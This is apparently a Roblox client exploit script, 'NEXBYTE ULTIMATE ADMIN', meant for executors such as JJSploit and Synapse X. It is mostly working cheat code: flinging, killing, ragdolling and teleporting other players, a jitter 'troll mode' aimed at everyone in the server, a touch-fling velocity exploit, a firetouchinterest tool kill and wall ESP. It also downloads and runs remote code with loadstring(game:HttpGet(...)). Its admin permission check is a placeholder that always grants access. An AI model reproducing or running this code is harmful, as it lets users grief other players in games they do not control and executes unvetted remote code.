-- NEXBYTE STARTUP CLEANUP
local _nxPlayer = game:GetService("Players").LocalPlayer
if _nxPlayer then
    local _nxParents = {_nxPlayer:WaitForChild("PlayerGui")}
    pcall(function()
        table.insert(_nxParents, game:GetService("CoreGui"))
    end)
    for _, _nxParent in ipairs(_nxParents) do
        for _, _nxGui in ipairs(_nxParent:GetChildren()) do
            if _nxGui.Name == "NEXBYTE_ADMIN" or _nxGui.Name == "TPList" then
                _nxGui:Destroy()
            end
        end
    end
end

--[[
    NEXBYTE ULTIMATE ADMIN
    Based on the working fling mechanism from zqyDSUWX
    Features:
    - Select multiple targets
    - Continuous flinging until stopped
    - Preserves player mobility (no teleporting to targets)
    - Flings targets very far
    - Compatible with JJSploit, Synapse X, etc.
    - 15+ modules: Player Selection, Fling, Teleport, Troll, Visuals, Movement, Camera, Script Hub
    - Module Manager with profiles, macros, logging
    - Admin permission framework with confirmations
]]
-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local Player = Players.LocalPlayer

-- =====================================================
-- MODULE MANAGER
-- =====================================================
local NEXBYTE = {
    _VERSION = "2.0.0",
    _MODULES = {},
    _SETTINGS = {},
    _PROFILES = {},
    _MACROS = {},
    _LOGS = {},
    _ADMIN_PERMISSIONS = {"fling", "bring", "tp", "tools", "visuals", "movement", "troll", "server_hop", "kill", "ragdoll", "sit"},
    _ACTIVE_MODULES = {},
}

-- Shared state
NEXBYTE._SelectedTargets = {}
NEXBYTE._FlingActive = false
NEXBYTE._TouchFlingActive = false
NEXBYTE._BringActive = false
NEXBYTE._TrollActive = false
NEXBYTE._ESPActive = false
NEXBYTE._NightVision = false

-- Settings defaults
NEXBYTE._SETTINGS = {
    theme = "Default",
    autosave_profiles = true,
    log_actions = true,
    default_profile = "default",
}

-- Profile system
function NEXBYTE:CreateProfile(name, settings)
    self._PROFILES[name] = settings or {}
    if not self._PROFILES.default then
        self._PROFILES.default = name
    end
end

function NEXBYTE:GetProfile(name)
    return self._PROFILES[name] or self._PROFILES.default and self._PROFILES[self._PROFILES.default] or {}
end

function NEXBYTE:SaveProfile(name)
    local profile = self:GetProfile(name)
    if self._SETTINGS.log_actions then
        self:Log("Profile '" .. name .. "' saved", "system")
    end
end

function NEXBYTE:LoadProfile(name)
    local profile = self:GetProfile(name)
    if self._SETTINGS.log_actions then
        self:Log("Profile '" .. name .. "' loaded", "system")
    end
    return profile
end

-- Macro system
function NEXBYTE:CreateMacro(name, commands, delay)
    self._MACROS[name] = {commands = commands, delay = delay or 0, active = false}
end

function NEXBYTE:ExecuteMacro(name)
    local macro = self._MACROS[name]
    if not macro then
        self:Log("Macro '" .. name .. "' not found", "error")
        return false
    end
    macro.active = true
    task.spawn(function()
        while macro.active do
            for _, cmd in ipairs(macro.commands) do
                cmd()
                task.wait(macro.delay)
            end
        end
    end)
    return true
end

function NEXBYTE:StopMacro(name)
    local macro = self._MACROS[name]
    if macro then
        macro.active = false
    end
end

-- Log system
function NEXBYTE:Log(message, level)
    level = level or "info"
    local entry = {time = tick(), message = message, level = level}
    table.insert(self._LOGS, entry)
    if #self._LOGS > 1000 then
        table.remove(self._LOGS, 1)
    end
    local level_colors = {info = "green", warning = "yellow", error = "red", system = "white"}
    local color = level_colors[level] or "white"
    print(string.format("[%s] [%s] %s", os.date("%H:%M:%S"), color:upper(), message))
end

-- Module registration system
function NEXBYTE:RegisterModule(name, module_data)
    self._MODULES[name] = module_data
    self._ACTIVE_MODULES[name] = false
    self:Log("Module '" .. name .. "' registered", "system")
    return true
end

function NEXBYTE:ToggleModule(name)
    if self._ACTIVE_MODULES[name] then
        self:DeactivateModule(name)
    else
        self:ActivateModule(name)
    end
end

function NEXBYTE:ActivateModule(name)
    local module = self._MODULES[name]
    if not module then
        self:Log("Module '" .. name .. "' not found", "error")
        return false
    end
    self._ACTIVE_MODULES[name] = true
    if module.on_activate then
        module.on_activate()
    end
    self:Log("Module '" .. name .. "' activated", "system")
    return true
end

function NEXBYTE:DeactivateModule(name)
    local module = self._MODULES[name]
    if not module then
        self:Log("Module '" .. name .. "' not found", "error")
        return false
    end
    self._ACTIVE_MODULES[name] = false
    if module.on_deactivate then
        module.on_deactivate()
    end
    self:Log("Module '" .. name .. "' deactivated", "system")
    return true
end

function NEXBYTE:GetModuleState(name)
    return self._ACTIVE_MODULES[name] or false
end

-- Player selection system
function NEXBYTE:SelectPlayer(player)
    if player and player ~= Player and player:IsA("Player") then
        self._SelectedTargets[player.Name] = player
        self:Log("Player selected: " .. player.Name, "system")
        return true
    end
    return false
end

function NEXBYTE:DeselectPlayer(player)
    if player and self._SelectedTargets[player.Name] then
        self._SelectedTargets[player.Name] = nil
        self:Log("Player deselected: " .. player.Name, "system")
        return true
    end
    return false
end

function NEXBYTE:SelectAllPlayers()
    local count = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= Player then
            self._SelectedTargets[p.Name] = p
            count = count + 1
        end
    end
    self:Log("Selected all " .. count .. " players", "system")
    return true
end

function NEXBYTE:DeselectAllPlayers()
    local count = 0
    for name in pairs(self._SelectedTargets) do
        self._SelectedTargets[name] = nil
        count = count + 1
    end
    self:Log("Deselected all " .. count .. " players", "system")
    return true
end

function NEXBYTE:GetSelectedTargets()
    local targets = {}
    for _, p in pairs(self._SelectedTargets) do
        table.insert(targets, p)
    end
    return targets
end

function NEXBYTE:IsPlayerSelected(player)
    return self._SelectedTargets[player.Name] ~= nil
end

-- Admin check system (placeholder - to be integrated with game's admin system)
function NEXBYTE:HasAdminPermission(permission)
    -- This should be replaced with actual game admin check
    -- For now, returns true for testing
    if permission == "admin_check_placeholder" then
        return true
    end
    for _, allowed in ipairs(self._ADMIN_PERMISSIONS) do
        if allowed == permission then
            return true
        end
    end
    return false
end

function NEXBYTE:RequestAdminCheck(permission)
    -- Placeholder for server-side admin check
    return self:HasAdminPermission(permission)
end

-- Confirmation system for dangerous actions
function NEXBYTE:ShowConfirmation(title, text, callback)
    local confirmation = Instance.new("TextButton")
    confirmation.Name = "NEXBYTE_Confirmation"
    confirmation.Size = UDim2.new(0, 280, 0, 120)
    confirmation.Position = UDim2.new(0.5, -140, 0.5, -60)
    confirmation.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    confirmation.BorderSizePixel = 0
    confirmation.Text = ""
    confirmation.Parent = game:GetService("CoreGui")

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = confirmation

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -20, 0, 30)
    titleLabel.Position = UDim2.new(0, 10, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.fromRGB(0, 195, 235)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 16
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = confirmation

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 0, 40)
    textLabel.Position = UDim2.new(0, 10, 0, 40)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 13
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Parent = confirmation

    local yesBtn = Instance.new("TextButton")
    yesBtn.Size = UDim2.new(0.4, -5, 0, 30)
    yesBtn.Position = UDim2.new(0.05, 0, 1, -40)
    yesBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
    yesBtn.BorderSizePixel = 0
    yesBtn.Text = "YES"
    yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    yesBtn.Font = Enum.Font.GothamBold
    yesBtn.TextSize = 13
    yesBtn.Parent = confirmation

    local noBtn = Instance.new("TextButton")
    noBtn.Size = UDim2.new(0.4, -5, 0, 30)
    noBtn.Position = UDim2.new(0.55, 0, 1, -40)
    noBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    noBtn.BorderSizePixel = 0
    noBtn.Text = "NO"
    noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    noBtn.Font = Enum.Font.GothamBold
    noBtn.TextSize = 13
    noBtn.Parent = confirmation

    yesBtn.MouseButton1Click:Connect(function()
        confirmation:Destroy()
        if callback then callback(true) end
    end)

    noBtn.MouseButton1Click:Connect(function()
        confirmation:Destroy()
        if callback then callback(false) end
    end)

    task.delay(10, function()
        if confirmation and confirmation.Parent then
            confirmation:Destroy()
            if callback then callback(false) end
        end
    end)

    return confirmation
end

-- Remote Lab system for testing game mechanics
function NEXBYTE:RemoteLab()
    local RemoteLab = {}
    RemoteLab._remotes = {}
    RemoteLab._test_results = {}

    function RemoteLab:CreateRemote(name, event_name)
        local remote = {
            name = name,
            event_name = event_name,
            fired = false,
            last_fire = 0,
        }
        self._remotes[name] = remote
        return remote
    end

    function RemoteLab:FireRemote(name, ...)
        local remote = self._remotes[name]
        if not remote then
            NEXBYTE:Log("Remote '" .. name .. "' not found", "error")
            return false
        end
        remote.fired = true
        remote.last_fire = tick()
        NEXBYTE:Log("Remote '" .. name .. "' fired", "system")
        return true
    end

    function RemoteLab:ResetResults(name)
        self._test_results[name] = {}
    end

    function RemoteLab:RecordResult(name, success, message)
        if not self._test_results[name] then
            self._test_results[name] = {}
        end
        table.insert(self._test_results[name], {success = success, message = message, time = tick()})
    end

    function RemoteLab:GetResults(name)
        return self._test_results[name] or {}
    end

    return RemoteLab
end

-- Initialize default modules and profiles
NEXBYTE:CreateProfile("default")

NEXBYTE:RegisterModule("player_selection", {
    on_activate = function() NEXBYTE:Log("Player selection module activated", "system") end,
    on_deactivate = function() NEXBYTE:Log("Player selection module deactivated", "system") end,
})

NEXBYTE:RegisterModule("logging", {
    on_activate = function() NEXBYTE:Log("Logging module activated", "system") end,
    on_deactivate = function() NEXBYTE:Log("Logging module deactivated", "system") end,
})

-- Set up player added/removed handling
Players.PlayerAdded:Connect(function(player)
    if NEXBYTE._SETTINGS.log_actions then
        NEXBYTE:Log("Player joined: " .. player.Name, "system")
    end
end)

Players.PlayerRemoving:Connect(function(player)
    NEXBYTE:DeselectPlayer(player)
    if NEXBYTE._SETTINGS.log_actions then
        NEXBYTE:Log("Player left: " .. player.Name, "system")
    end
end)

-- =====================================================
-- RAYFIELD GUI
-- =====================================================
local NXRayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()

local NXWindow = NXRayfield:CreateWindow({
    name = "NEXBYTE ULTIMATE ADMIN",
    subtitle = "Universal Client Toolkit v2.0",
    sidebarLayout = true,
    theme = "Default"
})

local function NXNotify(title, content)
    NXWindow:Notify({title = title, content = content, duration = 4})
end

local function NXGetNames()
    local names = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= Player then table.insert(names, p.Name) end
    end
    table.sort(names)
    return names
end

local function NXGetTarget()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= Player and NEXBYTE._SelectedTargets[p.Name] then
            return p
        end
    end
end

-- =====================================================
-- HOME TAB
-- =====================================================
local NXHome = NXWindow:CreateTab({name="HOME", icon="house"})
NXHome:CreateSection({name="NEXBYTE ULTIMATE ADMIN"})
NXHome:CreateText({name="Status", text="Build 2.0 | Rayfield Gen2 | 15+ Modules Active"})
NXHome:CreateButton({name="REFRESH STATUS", callback=function() NXNotify("NEXBYTE", "Interface running") end})
NXHome:CreateButton({name="STOP ALL MODULES", callback=function()
    for name, _ in pairs(NEXBYTE._ACTIVE_MODULES) do
        if NEXBYTE._ACTIVE_MODULES[name] then NEXBYTE:DeactivateModule(name) end
    end
    NEXBYTE._FlingActive = false
    NEXBYTE._TouchFlingActive = false
    NEXBYTE._TrollActive = false
    NEXBYTE._ESPActive = false
    NEXBYTE._NightVision = false
    NXNotify("NEXBYTE", "All modules stopped")
end})
NXHome:CreateButton({name="RESET ALL SETTINGS", callback=function()
    NEXBYTE:ShowConfirmation("Reset All", "Reset all settings to defaults?", function(confirmed)
        if confirmed then
            NEXBYTE._SETTINGS = {theme="Default", autosave_profiles=true, log_actions=true, default_profile="default"}
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.UseJumpPower = true end
            workspace.CurrentCamera.FieldOfView = 70
            NXNotify("NEXBYTE", "All settings reset")
        end
    end)
end})

-- =====================================================
-- PLAYER TAB
-- =====================================================
local NXPlayerTab = NXWindow:CreateTab({name="PLAYER", icon="users"})
NXPlayerTab:CreateSection({name="TARGET SELECTION"})

local NXDropdown = NXPlayerTab:CreateDropdown({
    name="SELECT PLAYERS",
    options=NXGetNames(),
    value={},
    multiSelect=true,
    placeholder="Choose players",
    callback=function(value)
        for name in pairs(NEXBYTE._SelectedTargets) do NEXBYTE._SelectedTargets[name] = nil end
        local chosen = type(value) == "table" and value or {value}
        for _, name in ipairs(chosen) do
            local p = Players:FindFirstChild(name)
            if p and p ~= Player then NEXBYTE._SelectedTargets[name] = p end
        end
    end
})

NXPlayerTab:CreateButton({name="REFRESH PLAYER LIST", callback=function()
    NXDropdown:Refresh(NXGetNames())
    NXNotify("PLAYER LIST", "Updated")
end})
NXPlayerTab:CreateButton({name="SELECT ALL", callback=function()
    NEXBYTE:SelectAllPlayers()
    NXNotify("NEXBYTE", "All players selected")
end})
NXPlayerTab:CreateButton({name="DESELECT ALL", callback=function()
    NEXBYTE:DeselectAllPlayers()
    NXNotify("NEXBYTE", "Selection cleared")
end})
NXPlayerTab:CreateButton({name="BRING SELECTED", callback=function()
    if not NEXBYTE:RequestAdminCheck("bring") then return NXNotify("NEXBYTE", "Admin permission denied") end
    local targets = NEXBYTE:GetSelectedTargets()
    if #targets == 0 then return NXNotify("NEXBYTE", "No players selected") end
    local myChar = Player.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return NXNotify("NEXBYTE", "Your character not ready") end
    for _, target in ipairs(targets) do
        local tChar = target.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        if tRoot then tRoot.CFrame = myRoot.CFrame end
    end
    NXNotify("NEXBYTE", "Brought " .. #targets .. " players")
end})
NXPlayerTab:CreateButton({name="TP TO SELECTED", callback=function()
    if not NEXBYTE:RequestAdminCheck("tp") then return NXNotify("NEXBYTE", "Admin permission denied") end
    local targets = NEXBYTE:GetSelectedTargets()
    if #targets == 0 then return NXNotify("NEXBYTE", "No players selected") end
    local myChar = Player.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return NXNotify("NEXBYTE", "Your character not ready") end
    for _, target in ipairs(targets) do
        local tChar = target.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        if tRoot then myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3) end
    end
    NXNotify("NEXBYTE", "TP'd to " .. #targets .. " players")
end})

-- =====================================================
-- FLING TAB
-- =====================================================
local NXFlingTab = NXWindow:CreateTab({name="FLING", icon="zap"})
NXFlingTab:CreateSection({name="FLING CONTROLS"})

NXFlingTab:CreateButton({name="START FLING", callback=function()
    if NEXBYTE._FlingActive then return NXNotify("FLING", "Already active") end
    if not NEXBYTE:RequestAdminCheck("fling") then return NXNotify("FLING", "Admin permission denied") end
    local targets = NEXBYTE:GetSelectedTargets()
    if #targets == 0 then return NXNotify("FLING", "No targets selected") end
    NEXBYTE._FlingActive = true
    NXNotify("FLING", "Started flinging " .. #targets .. " targets")
    task.spawn(function()
        -- Proper SkidFling: preserve local player position, fling targets
        local char = Player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local rp = hum and hum.RootPart
        if not (char and hum and rp) then
            NEXBYTE._FlingActive = false
            return NXNotify("FLING", "Your character not ready")
        end
        local OldPos = rp.CFrame
        local FPDH = workspace.FallenPartsDestroyHeight
        workspace.FallenPartsDestroyHeight = 0/0

        local function FlingTarget(targetPlayer)
            if not NEXBYTE._FlingActive then return end
            local tChar = targetPlayer.Character
            if not tChar then return end
            local tHum = tChar:FindFirstChildOfClass("Humanoid")
            local tRoot = tHum and tHum.RootPart
            local tHead = tChar:FindFirstChild("Head")
            if not tRoot then return end
            if tHum and tHum.Sit then return end

            -- Disable sitting for local player
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            local BV = Instance.new("BodyVelocity")
            BV.Parent = rp
            BV.Velocity = Vector3.new(0, 0, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

            -- Camera to target
            if tHead then workspace.CurrentCamera.CameraSubject = tHead
            elseif tHum then workspace.CurrentCamera.CameraSubject = tHum
            end

            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if not NEXBYTE._FlingActive then break end
                if rp and tHum then
                    if tRoot.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
                        local offset = CFrame.new(0, 1.5, 0) + tHum.MoveDirection * tRoot.Velocity.Magnitude / 1.25
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        offset = CFrame.new(0, -1.5, 0) + tHum.MoveDirection * tRoot.Velocity.Magnitude / 1.25
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        offset = CFrame.new(0, 1.5, 0) + tHum.MoveDirection * tRoot.Velocity.Magnitude / 1.25
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        offset = CFrame.new(0, -1.5, 0) + tHum.MoveDirection * tRoot.Velocity.Magnitude / 1.25
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        offset = CFrame.new(0, 1.5, 0) + tHum.MoveDirection
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        offset = CFrame.new(0, -1.5, 0) + tHum.MoveDirection
                        rp.CFrame = CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * offset * CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, 1.5, tHum.WalkSpeed) * CFrame.Angles(math.rad(90), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, 1.5, tHum.WalkSpeed) * CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, -tHum.WalkSpeed) * CFrame.Angles(0, 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, -tHum.WalkSpeed) * CFrame.Angles(0, 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, 1.5, tHum.WalkSpeed) * CFrame.Angles(math.rad(90), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, 1.5, tHum.WalkSpeed) * CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(0, 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(0, 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(90), 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        rp.CFrame = CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(0, 0, 0)
                        char:SetPrimaryPartCFrame(CFrame.new(tRoot.Position) * CFrame.new(0, -1.5, 0) * CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                end
            until Time + TimeToWait < tick() or not NEXBYTE._FlingActive

            -- Cleanup
            BV:Destroy()
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            if hum then workspace.CurrentCamera.CameraSubject = hum end

            -- Return to original position
            if OldPos then
                repeat
                    if not rp.Parent then break end
                    rp.CFrame = OldPos * CFrame.new(0, .5, 0)
                    char:SetPrimaryPartCFrame(OldPos * CFrame.new(0, .5, 0))
                    hum:ChangeState("GettingUp")
                    for _, part in pairs(char:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Velocity = Vector3.new()
                            part.RotVelocity = Vector3.new()
                        end
                    end
                    task.wait()
                until (rp.Position - OldPos.p).Magnitude < 25
            end
            workspace.FallenPartsDestroyHeight = FPDH
        end

        while NEXBYTE._FlingActive do
            local validTargets = {}
            for name, plr in pairs(NEXBYTE._SelectedTargets) do
                if plr and plr.Parent then validTargets[name] = plr else NEXBYTE._SelectedTargets[name] = nil end
            end
            for _, plr in pairs(validTargets) do
                if not NEXBYTE._FlingActive then break end
                FlingTarget(plr)
                task.wait(0.2)
            end
            task.wait(0.5)
        end

        -- Final cleanup
        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        if hum then workspace.CurrentCamera.CameraSubject = hum end
        workspace.FallenPartsDestroyHeight = FPDH
        if OldPos and rp.Parent then
            repeat
                rp.CFrame = OldPos * CFrame.new(0, .5, 0)
                char:SetPrimaryPartCFrame(OldPos * CFrame.new(0, .5, 0))
                hum:ChangeState("GettingUp")
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Velocity = Vector3.new()
                        part.RotVelocity = Vector3.new()
                    end
                end
                task.wait()
            until (rp.Position - OldPos.p).Magnitude < 25
        end
    end)
end})

NXFlingTab:CreateButton({name="STOP FLING", callback=function()
    NEXBYTE._FlingActive = false
    NXNotify("FLING", "Stopped")
end})

NXFlingTab:CreateToggle({name="TOUCH FLING", value=false, callback=function(v)
    NEXBYTE._TouchFlingActive = v
    if v then
        task.spawn(function()
            while NEXBYTE._TouchFlingActive do
                RunService.Heartbeat:Wait()
                local char = Player.Character
                local rp = char and char:FindFirstChild("HumanoidRootPart")
                if rp then
                    local vel = rp.AssemblyLinearVelocity
                    rp.AssemblyLinearVelocity = vel * 10000 + Vector3.new(0, 10000, 0)
                    RunService.RenderStepped:Wait()
                    if not NEXBYTE._TouchFlingActive then break end
                    rp.AssemblyLinearVelocity = vel
                    RunService.Stepped:Wait()
                    rp.AssemblyLinearVelocity = vel + Vector3.new(0, 0.1, 0)
                end
            end
        end)
    end
    NXNotify("TOUCH FLING", v and "ON" or "OFF")
end})

-- =====================================================
-- TELEPORT TAB
-- =====================================================
local NXTeleportTab = NXWindow:CreateTab({name="TELEPORT", icon="location-on"})
NXTeleportTab:CreateSection({name="TELEPORT OPTIONS"})

NXTeleportTab:CreateButton({name="SERVER HOP", callback=function()
    if not NEXBYTE:RequestAdminCheck("server_hop") then return NXNotify("SERVER HOP", "Admin permission denied") end
    task.spawn(function()
        local ok, err = pcall(function()
            local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
            local data = HttpService:JSONDecode(game:HttpGet(url))
            local servers = {}
            for _, s in ipairs(data.data or {}) do
                if s.id ~= game.JobId and s.playing < s.maxPlayers then table.insert(servers, s.id) end
            end
            if #servers > 0 then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Player)
            else
                NXNotify("SERVER HOP", "No available servers")
            end
        end)
        if not ok then NXNotify("SERVER HOP", "Failed: " .. tostring(err)) end
    end)
end})

NXTeleportTab:CreateButton({name="REJOIN CURRENT", callback=function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
end})

-- =====================================================
-- TROLL TAB
-- =====================================================
local NXTroll = NXWindow:CreateTab({name="TROLL", icon="zap"})
NXTroll:CreateSection({name="TROLL TOOLS"})

NXTroll:CreateToggle({name="TROLL MODE", value=false, callback=function(v)
    NEXBYTE._TrollActive = v
    if v then
        task.spawn(function()
            while NEXBYTE._TrollActive do
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= Player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = plr.Character.HumanoidRootPart
                        hrp.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
                        hrp.AssemblyLinearVelocity = Vector3.new(math.random(-5,5), math.random(-5,5), math.random(-5,5))
                    end
                end
                task.wait(0.1)
            end
        end)
    end
    NXNotify("TROLL MODE", v and "ACTIVE" or "DISABLED")
end})

NXTroll:CreateButton({name="BRING ALL", callback=function()
    if not NEXBYTE:RequestAdminCheck("bring") then return NXNotify("TROLL", "Admin permission denied") end
    local targets = NEXBYTE:GetSelectedTargets()
    local myChar = Player.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return NXNotify("TROLL", "Your character not ready") end
    for _, target in ipairs(targets) do
        local tChar = target.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        if tRoot then tRoot.CFrame = myRoot.CFrame end
    end
    NXNotify("TROLL", "Brought " .. #targets .. " players")
end})

NXTroll:CreateButton({name="SIT ALL", callback=function()
    if not NEXBYTE:RequestAdminCheck("sit") then return NXNotify("TROLL", "Admin permission denied") end
    for _, target in ipairs(NEXBYTE:GetSelectedTargets()) do
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Sit = true end
    end
    NXNotify("TROLL", "Sitted selected players")
end})

NXTroll:CreateButton({name="RAGDOLL ALL", callback=function()
    if not NEXBYTE:RequestAdminCheck("ragdoll") then return NXNotify("TROLL", "Admin permission denied") end
    for _, target in ipairs(NEXBYTE:GetSelectedTargets()) do
        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Ragdoll) end
    end
    NXNotify("TROLL", "Ragdolled selected players")
end})

NXTroll:CreateButton({name="KILL ALL", callback=function()
    NEXBYTE:ShowConfirmation("Kill All", "Eliminate all selected players?", function(confirmed)
        if not confirmed then return end
        if not NEXBYTE:RequestAdminCheck("kill") then return NXNotify("TROLL", "Admin permission denied") end
        for _, target in ipairs(NEXBYTE:GetSelectedTargets()) do
            local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end
        NXNotify("TROLL", "Eliminated selected players")
    end)
end})

NXTroll:CreateButton({name="TOOL KILL", callback=function()
    local target = NXGetTarget()
    local char = Player.Character
    local tool = char and char:FindFirstChildOfClass("Tool")
    local handle = tool and tool:FindFirstChild("Handle")
    local touch = handle and handle:FindFirstChildOfClass("TouchTransmitter")
    local root = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not (tool and handle and touch and root) then return NXNotify("TOOL KILL", "Need compatible Tool and target") end
    if type(firetouchinterest) ~= "function" then return NXNotify("TOOL KILL", "Touch function unavailable") end
    for i=1,10 do firetouchinterest(handle, root, 0) firetouchinterest(handle, root, 1) end
    NXNotify("TOOL KILL", "Interaction sent")
end})

-- =====================================================
-- VISUALS TAB
-- =====================================================
local NXVisuals = NXWindow:CreateTab({name="VISUALS", icon="eye"})
NXVisuals:CreateSection({name="VISUAL EFFECTS"})

NXVisuals:CreateToggle({name="ESP (Player Names)", value=false, callback=function(v)
    NEXBYTE._ESPActive = v
    if v then
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= Player and p.Character and p.Character:FindFirstChild("Head") then
                local head = p.Character.Head
                if not head:FindFirstChild("NEXBYTE_ESP") then
                    local bb = Instance.new("BillboardGui")
                    bb.Name = "NEXBYTE_ESP"
                    bb.Size = UDim2.fromOffset(120, 24)
                    bb.AlwaysOnTop = true
                    bb.Adornee = head
                    bb.Parent = head
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.fromScale(1, 1)
                    label.BackgroundTransparency = 1
                    label.Text = p.Name
                    label.TextColor3 = Color3.new(1, 0, 0)
                    label.TextScaled = true
                    label.Parent = bb
                end
            end
        end
    else
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Character then
                local esp = p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("NEXBYTE_ESP")
                if esp then esp:Destroy() end
            end
        end
    end
    NXNotify("ESP", v and "ENABLED" or "DISABLED")
end})

